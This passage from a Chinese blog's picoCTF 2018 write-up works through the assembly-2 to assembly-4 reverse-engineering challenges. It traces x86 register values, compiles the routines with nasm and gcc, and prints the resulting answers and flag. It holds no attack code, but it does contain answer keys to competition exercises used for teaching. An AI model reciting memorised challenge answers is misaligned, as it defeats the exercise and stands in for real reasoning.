</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-24>24</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>.intel_syntax noprefix
</span></span><span style=display:flex><span>.bits 32
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>.global asm2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>asm2:
</span></span><span style=display:flex><span>	push   	ebp
</span></span><span style=display:flex><span>	mov    	ebp,esp
</span></span><span style=display:flex><span>	sub    	esp,0x10
</span></span><span style=display:flex><span>	mov    	eax,DWORD PTR [ebp+0xc]
</span></span><span style=display:flex><span>	mov 	DWORD PTR [ebp-0x4],eax
</span></span><span style=display:flex><span>	mov    	eax,DWORD PTR [ebp+0x8]
</span></span><span style=display:flex><span>	mov	DWORD PTR [ebp-0x8],eax
</span></span><span style=display:flex><span>	jmp    	part_b
</span></span><span style=display:flex><span>part_a:	
</span></span><span style=display:flex><span>	add    	DWORD PTR [ebp-0x4],0x1
</span></span><span style=display:flex><span>	add	DWORD PTR [ebp+0x8],0x76
</span></span><span style=display:flex><span>part_b:	
</span></span><span style=display:flex><span>	cmp    	DWORD PTR [ebp+0x8],0xa1de
</span></span><span style=display:flex><span>	jle    	part_a
</span></span><span style=display:flex><span>	mov    	eax,DWORD PTR [ebp-0x4]
</span></span><span style=display:flex><span>	mov	esp,ebp
</span></span><span style=display:flex><span>	pop	ebp
</span></span><span style=display:flex><span>	ret
</span></span></code></pre></td></tr></table></div></div><h2 id=assembly-3>assembly-3<a hidden class=anchor aria-hidden=true href=#assembly-3>#</a></h2><p>What does asm3(0xbda42100,0xb98dd6a5,0xecded223) return? 0x478</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ebp+0x8=&gt;0xbda42100
</span></span><span style=display:flex><span>ebp+0xc=&gt;0xb98dd6a5
</span></span><span style=display:flex><span>ebp+0x10=&gt;0xecded223
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>.intel_syntax noprefix
</span></span><span style=display:flex><span>.bits 32
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.global asm3
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>asm3:
</span></span><span style=display:flex><span>        push    ebp
</span></span><span style=display:flex><span>        mov     ebp,esp
</span></span><span style=display:flex><span>        mov     eax,0xbc;0xbc
</span></span><span style=display:flex><span>        xor     al,al;0x00
</span></span><span style=display:flex><span>        mov     ah,BYTE PTR [ebp+0x9];0x2100
</span></span><span style=display:flex><span>        sal     ax,0x10;0x0000
</span></span><span style=display:flex><span>        sub     al,BYTE PTR [ebp+0xc];0x005b
</span></span><span style=display:flex><span>        add     ah,BYTE PTR [ebp+0xd];0xd65b
</span></span><span style=display:flex><span>        xor     ax,WORD PTR [ebp+0x10];0xd65b^0xd223=0x478
</span></span><span style=display:flex><span>        mov     esp, ebp
</span></span><span style=display:flex><span>        pop     ebp
</span></span><span style=display:flex><span>        ret
</span></span></code></pre></td></tr></table></div></div><p>有几点需要注意。一是数据采用小端序存储，高字节在高地址，[ebp+0x8]的值是0x00而非0xbd；二是 <code>sub 0x00,0xa5</code> 的值是<code>0x100-0xa5=0x5b</code> 。 三是<code>WORD PTR [ebp+0x10]</code> 的值是<code>0xd223</code> 而非<code>0x23d2</code> 。</p><p><img loading=lazy src=b4db6c5bb7ec4d90a.png alt></p><p>可参考 <a href=https://github.com/xnand/ctf_writeups/blob/master/picoCTF2018/assembly-0-1-2-3-4/README.md>此处</a> 将汇编代码编译成共享库在C程序中调用。执行得到结果，也可调试加深理解。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-33>33</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>section</span> <span style=color:#66d9ef>.text</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>global</span> <span style=color:#66d9ef>asm3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>asm3:
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>push</span>   	<span style=color:#66d9ef>ebp</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>mov</span>    	<span style=color:#66d9ef>ebp</span>,<span style=color:#66d9ef>esp</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>mov</span>	<span style=color:#66d9ef>eax</span>,<span style=color:#ae81ff>0x19</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>xor</span>	<span style=color:#66d9ef>al</span>,<span style=color:#66d9ef>al</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>mov</span>	<span style=color:#66d9ef>ah</span>,<span style=color:#66d9ef>BYTE</span> [<span style=color:#66d9ef>ebp</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0xa</span>]
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>sal</span>	<span style=color:#66d9ef>ax</span>,<span style=color:#ae81ff>0x10</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>sub</span>	<span style=color:#66d9ef>al</span>,<span style=color:#66d9ef>BYTE</span> [<span style=color:#66d9ef>ebp</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0xd</span>]
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>add</span>	<span style=color:#66d9ef>ah</span>,<span style=color:#66d9ef>BYTE</span> [<span style=color:#66d9ef>ebp</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0xc</span>]
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>xor</span>	<span style=color:#66d9ef>ax</span>,<span style=color:#66d9ef>WORD</span> [<span style=color:#66d9ef>ebp</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0x12</span>]
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>mov</span>	<span style=color:#66d9ef>esp</span>, <span style=color:#66d9ef>ebp</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>pop</span>	<span style=color:#66d9ef>ebp</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ret</span>
</span></span><span style=display:flex><span><span style=color:#75715e>##################
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include &lt;stdio.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>extern</span> <span style=color:#66d9ef>int</span> <span style=color:#66d9ef>asm3</span>(<span style=color:#66d9ef>int</span> <span style=color:#66d9ef>a</span>, <span style=color:#66d9ef>int</span> <span style=color:#66d9ef>b</span>, <span style=color:#66d9ef>int</span> <span style=color:#66d9ef>c</span>)<span style=color:#75715e>;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>int</span> <span style=color:#66d9ef>main</span>(<span style=color:#66d9ef>void</span>) <span style=color:#960050;background-color:#1e0010>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#ae81ff>0</span><span style=color:#66d9ef>x</span>%x<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#66d9ef>n</span><span style=color:#960050;background-color:#1e0010>&#34;</span>, <span style=color:#66d9ef>asm3</span>(<span style=color:#ae81ff>0xb5e8e971</span>,<span style=color:#ae81ff>0xc6b58a95</span>,<span style=color:#ae81ff>0xe20737e9</span>))<span style=color:#75715e>;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>return</span> <span style=color:#ae81ff>0</span><span style=color:#75715e>;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>}</span>
</span></span><span style=display:flex><span><span style=color:#75715e>##################
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>[</span><span style=color:#a6e22e>andrei@jacky</span> <span style=color:#ae81ff>15</span>:<span style=color:#ae81ff>27</span>:<span style=color:#ae81ff>00</span>] <span style=color:#960050;background-color:#1e0010>~/</span><span style=color:#66d9ef>Documents</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#66d9ef>pico</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>——&gt;</span> <span style=color:#a6e22e>nasm</span> -<span style=color:#66d9ef>f</span> <span style=color:#66d9ef>elf32</span> <span style=color:#66d9ef>end_asm_rev.S</span> -<span style=color:#66d9ef>o</span> <span style=color:#66d9ef>asmfun.o</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>[</span><span style=color:#a6e22e>andrei@jacky</span> <span style=color:#ae81ff>15</span>:<span style=color:#ae81ff>27</span>:<span style=color:#ae81ff>42</span>] <span style=color:#960050;background-color:#1e0010>~/</span><span style=color:#66d9ef>Documents</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#66d9ef>pico</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>——&gt;</span> <span style=color:#a6e22e>gcc</span> <span style=color:#66d9ef>sol.c</span> <span style=color:#66d9ef>asmfun.o</span> -<span style=color:#66d9ef>o</span> <span style=color:#66d9ef>sol</span> -<span style=color:#66d9ef>m32</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>[</span><span style=color:#a6e22e>andrei@jacky</span> <span style=color:#ae81ff>15</span>:<span style=color:#ae81ff>27</span>:<span style=color:#ae81ff>59</span>] <span style=color:#960050;background-color:#1e0010>~/</span><span style=color:#66d9ef>Documents</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#66d9ef>pico</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>——&gt;</span> <span style=color:#960050;background-color:#1e0010>./</span><span style=color:#a6e22e>sol</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=assembly-4>assembly-4<a hidden class=anchor aria-hidden=true href=#assembly-4>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/pico18# nasm -f elf32 comp.nasm -o comp.o
</span></span><span style=display:flex><span>root@kali:~/ctf/pico18# gcc -m32 -o comp comp.o
</span></span><span style=display:flex><span>root@kali:~/ctf/pico18# ./comp
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>1_h0p3_y0u_c0mP1l3d_tH15_32429699163
</span></span></code></pre></td></tr></table></div></div><p><code>picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_3242969916}</code></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/181013-huwangbei-writeup/><span class=title>« Prev</span><br><span>护网杯解题记录</span></a>
<a class=next href=https://ret2neo.cn/post/180920-heidunbei/><span class=title>Next »</span><br><span>福建省黑盾杯解题报告</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const 